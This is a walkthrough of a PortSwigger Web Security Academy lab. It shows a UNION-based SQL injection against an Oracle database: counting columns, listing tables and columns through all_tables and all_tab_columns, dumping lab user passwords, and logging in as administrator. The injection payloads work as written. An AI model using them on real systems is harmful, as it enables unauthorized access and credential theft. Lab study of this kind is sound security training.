## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/0c2ba0af839ebec800b248b0cd40eb2daeb7fc70/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/Lab%20Description.png)

## Solution :


> NOTE -  On Oracle databases, every `SELECT` statement must **specify a table to select FROM**. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
>
>There is a built-in table on Oracle called **dual** which you can use for this purpose. 
>
> For example: `UNION SELECT 'abc' FROM dual`

#### Determine number of columns -

Order by 3 throws a error which means there are 2 columns.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/df54841332b8401b43c41b18d244497e72143b37/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/Number%20of%20Columns.png)

#### Determine column with text data

Here we use the `DUAL` table which is by defaut present in ORACLE databse

Both columns have text data

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'abc','def' FROM DUAL--
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/b1d2081d55c47bb356f833c06c48b974a09331f2/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/Columns%20contain%20String.png)

## Retreive data from ORACLE db -


#### List all tables -

We  can list all the tables by querying `SELECT * FROM all_tables`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT table_name,NULL FROM all_tables--
```

We get a list of all the tables,

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/986e3ef24a4d26c570ad48b500ea9bbc1a6e05a3/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/Available%20Tables.png)


The table which we are interested in is this 

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/d5407478db6479f8aab1e6589e32a1d553457608/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/Table%20Name.png)


#### List all columns -

We can list all the columns by querying `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_MVMNFH'--
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/363d192f81e49244ff02732548d392b0961bb860/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/List%20Columns%20on%20BurpSuite.png)

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/8dc90f67b425b1c96adb67ba0bf11700807f1e0d/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/List%20Columns%20on%20Webpage.png)


#### Retreive admin's password


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT USERNAME_YNHYHK,PASSWORD_LFRJHB FROM USERS_MVMNFH--
```

![image]()

administrator - `eyjpiterylmsfcqq25ja`
wiener        - `tl4drtumhh8bgq4ndq4f`
carlos        - `z8ir2ghepg2rjjqgq3av`

Now login as administrator,

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/38f651910f2543b2c00b85f4d6a550282f53a2c5/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/Lab%20Solution.png)


